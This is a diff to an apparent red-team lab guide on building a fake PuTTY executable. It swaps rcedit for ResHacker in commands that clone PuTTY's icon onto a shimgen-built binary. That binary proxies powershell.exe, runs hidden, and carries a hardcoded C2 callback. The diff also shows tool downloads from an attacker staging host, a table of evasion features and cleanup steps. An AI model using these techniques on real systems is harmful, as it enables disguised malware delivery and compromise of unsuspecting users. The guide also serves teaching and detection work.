@@ -117,7 +117,7 @@ Switch to your **Administrator PowerShell** terminal. Download the two tools fro
 ```powershell
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/shimgen.exe" -OutFile "C:\Users\Public\shimgen.exe"
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/strings.exe"  -OutFile "C:\Users\Public\strings.exe"
-Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/rcedit.exe"   -OutFile "C:\Users\Public\rcedit.exe"
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/ResHacker.exe" -OutFile "C:\Users\Public\ResHacker.exe"
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/putty.ico"    -OutFile "C:\Users\Public\putty.ico"
 cd C:\Users\Public
 ```
@@ -193,19 +193,20 @@ Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 
 ```powershell
 .\shimgen.exe --path "C:\Windows\System32\calc.exe" --gui --output ".\test_icon.exe"
-.\rcedit.exe ".\test_icon.exe" --set-icon "C:\Users\Public\putty.ico"
+.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action delete -mask ICONGROUP,,
+.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action add    -res "C:\Users\Public\putty.ico" -mask ICONGROUP,1,0
 ```
 
 <img width="1219" height="165" alt="image" src="https://github.com/user-attachments/assets/d47f3768-9748-4ae0-a8fa-58bb020a6605" />
 
 Open **File Explorer** and navigate to `C:\Users\Public`. You will see `test_icon.exe` bearing the exact PuTTY terminal icon — blue, white, and yellow, pixel-for-pixel identical to the real SSH client in `Program Files`. Double-click it: the Windows Calculator opens.
 
-The filename and icon say PuTTY. The binary runs Calculator. The `rcedit` utility does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
+The filename and icon say PuTTY. The binary runs Calculator. The `ResHacker` utility does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
 
 <img width="1260" height="714" alt="image" src="https://github.com/user-attachments/assets/1bb5702e-f98b-4dd6-88bb-7f6afd06323a" />
 
 >[!NOTE]
-> The `rcedit` utility applies standalone `.ico` files directly to the target PE binary. This means an attacker is not limited to impersonating applications that are already installed on the endpoint — icons can be pre-harvested and staged on the C2 server (like `putty.ico`) to clone any known application's visual identity, regardless of whether that application exists on the victim machine.
+> The `ResHacker` utility applies standalone `.ico` files directly to the target PE binary. This means an attacker is not limited to impersonating applications that are already installed on the endpoint — icons can be pre-harvested and staged on the C2 server (like `putty.ico`) to clone any known application's visual identity, regardless of whether that application exists on the victim machine.
 
 ---
 
@@ -264,7 +265,8 @@ With a clear understanding of each flag's effect, combine them into the final at
   --output  "C:\Users\Public\Desktop\putty.exe"
 
 # Apply the stolen PuTTY icon
-.\rcedit.exe "C:\Users\Public\Desktop\putty.exe" --set-icon "C:\Users\Public\putty.ico"
+.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action delete -mask ICONGROUP,,
+.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action add    -res "C:\Users\Public\putty.ico" -mask ICONGROUP,1,0
 ```
 
 <img width="1294" height="467" alt="image" src="https://github.com/user-attachments/assets/69b24f13-1f8a-438e-af04-f97a5b680a11" />
@@ -275,7 +277,7 @@ Each flag maps directly back to a capability demonstrated in isolation during Ph
 |---|---|---|
 | `--path powershell.exe` | Step 1 | Legitimate Windows binary used as execution proxy. No malicious executable is involved — only `powershell.exe`, which is trusted and signed by Microsoft. |
 | `--command "..."` | Step 4 | Full C2 callback command hardcoded into the binary. No `.bat`, `.ps1`, or script file is written to disk on the Windows machine. |
-| `rcedit --set-icon` | Step 3 | Fake binary is visually indistinguishable from the real PuTTY in File Explorer, on the Desktop, and in the Taskbar. |
+| `ResHacker` | Step 3 | Fake binary is visually indistinguishable from the real PuTTY in File Explorer, on the Desktop, and in the Taskbar. |
 | `--gui` | Step 2 | Execution is fully invisible. No console window, no flicker, no visual indication that anything happened. |
 | `--output Desktop\putty.exe` | Step 1 | Dropper placed at exactly the location the victim expects PuTTY to be. |
 
@@ -436,7 +438,7 @@ Remove-Item "C:\Users\Public\Desktop\putty.exe"     -Force
 # Remove downloaded tools
 Remove-Item "C:\Users\Public\shimgen.exe"           -Force
 Remove-Item "C:\Users\Public\strings.exe"           -Force
-Remove-Item "C:\Users\Public\rcedit.exe"            -Force
+Remove-Item "C:\Users\Public\ResHacker.exe"         -Force
 Remove-Item "C:\Users\Public\putty.ico"             -Force
 
 # Remove Phase 3 test binaries
